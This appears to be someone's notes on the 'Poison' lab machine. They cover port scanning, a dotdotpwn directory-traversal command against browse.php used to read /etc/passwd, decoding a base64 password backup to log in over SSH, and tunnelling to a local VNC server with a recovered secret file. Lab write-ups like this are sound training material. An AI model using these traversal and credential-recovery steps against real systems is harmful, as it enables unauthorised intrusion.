# Enumerate

## Scan

* All ports taking too long, just doing standard before sc sv

```
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

## Exploits?

22 - username enumeration and maybe privesc

80 - no

## Pages:

Found phpinfo from nikto

Found index, browse, info.php files from dirbuster. 

phpinfo.php gives a php test page. Calling on browse.php gives an error? Maybe gives the dir? 

```
Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 3072 bytes) in /usr/local/www/apache24/data/browse.php on line 2
```

Info.php: 

```
FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017 root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64
```

listfiles.php:

```
Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt ) 
```

phpinfo has the php stuff

Directory traversal possible:

```
/sbin/dotdotpwn -m http-url -h 10.10.10.84 -u http://10.10.10.84/browse.php?file=TRAVERSAL -k "root"
```

# Access

Get the /etc/passwd and find that 'charix' is a user. What about the password? 

make an unbase64 script, get password at the end and ssh in as charix

# Escalate

* no sudo -l
* crontab doesn't show anything I can access I think
* netstat shows nothing
* see on ps -a that tightvnc is running since I saw ippsecs picture
* see xvnc version: Xvnc version TightVNC-1.3.10. No exploits listed. 
* listening on localhost? ssh forwarder? Got that working with putty and vncviewer: https://dephace.com/securing-vnc-connection-on-kali-linux-with-ssh/
* Download the secrets zip folder that I totally forgot to do
* Use ssh tunnel to get access to the VNC server

```
ssh -L 5901:localhost:5901 charix@10.10.10.84
```

* Use VNCviewer to connect and then realize I need to use the -passwd flag with that secrets file. 

```
vncviewer localhost:5901 -passwd secret
```





# Lessons

* Find something that seems useful? Make sure it's written down in case you're stuck later. 

